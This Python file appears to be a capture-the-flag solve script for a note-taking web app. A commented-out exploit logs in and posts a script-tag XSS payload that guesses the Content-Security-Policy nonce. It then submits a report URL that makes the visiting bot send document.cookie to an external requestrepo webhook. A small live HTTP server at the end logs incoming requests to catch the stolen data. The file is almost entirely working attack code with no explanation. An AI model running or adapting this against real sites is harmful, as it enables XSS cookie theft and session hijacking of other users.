# import requests
# import re

# BASE_URL = "http://45.129.40.107:9666"
# BASE_URL_REPORT = "http://45.129.40.107:9667"
# PAYLOAD = """<script nonce=<NONCE>>eval(location.hash.substr(1))</script>"""

# session = requests.Session()

# def login():
#     session.post(f"{BASE_URL}/login",data={"username":"chanze","password":"chanze"})
#     print("[+] Gen session")

# def post_note(nonce=""):
#     r = session.post(f"{BASE_URL}/post_note",data={"note":PAYLOAD.replace("<NONCE>",nonce)}, allow_redirects=False)
#     #print(r.headers)
#     path_note = r.headers['Location']
#     print(f"[+] Create note: {path_note}")
#     return path_note

# def get_nonce(path_note):
#     r = session.get(f"{BASE_URL}{path_note}")
#     nonce = re.findall(r'nonce\-(\w+)',r.headers['Content-Security-Policy'])[0]
#     print(f"[+] Get Nonce: {nonce}")
#     return nonce

# def send_report(path_to_report):
#     url = f"http://192.168.16.3:8080/{path_to_report}#location=\"<WEBHOOK>?flag=\".concat(document.cookie)".replace("<WEBHOOK>","http://ffds4x92.requestrepo.com")
#     session.post(BASE_URL_REPORT,data={"url":url})

# if __name__ == "__main__":
#     login()
#     path_note = post_note()
#     nonce_array = [get_nonce(path_note) for _ in range(10)]
#     predict_next_nonce = "<PLACE_HOLDER>"
#     path_to_report = post_note(predict_next_nonce)
#     send_report(path_to_report)

from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"Received GET request with path: {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Received")

def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd server on port {port}')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
